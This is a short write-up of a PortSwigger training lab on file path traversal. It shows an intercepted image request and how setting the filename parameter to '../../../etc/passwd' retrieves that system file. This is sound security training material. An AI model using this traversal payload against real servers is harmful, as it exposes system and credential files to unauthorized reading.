# Lab Writeup: File path traversal, simple case

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/lab-simple

## Description

This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

1. Right click on one of the image then select "open image in new tab"
2. Intercept using Burp then send it to repeater. Here's the full intercepted request:

   ```
   GET /image?filename=11.jpg HTTP/2
   Host: 0afb003a03aced7184c9917b008300cc.web-security-academy.net
   Cookie: session=Vo711TeESx9TiUqXo11CY7ZbUalIPvbj
   Cache-Control: max-age=0
   Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: none
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Accept-Encoding: gzip, deflate, br
   Accept-Language: en-US,en;q=0.9
   Priority: u=0, i
   ```

3. From the intercepted request, change the filename to `../../../etc/passwd` then send. The file should be retrieved and the lab is solved.

   ![Simple Path Traversal](/assets/simple-path-traversal.png)

   ![Simple Path Traversal 1](/assets/simple-path-traversal-1.png)
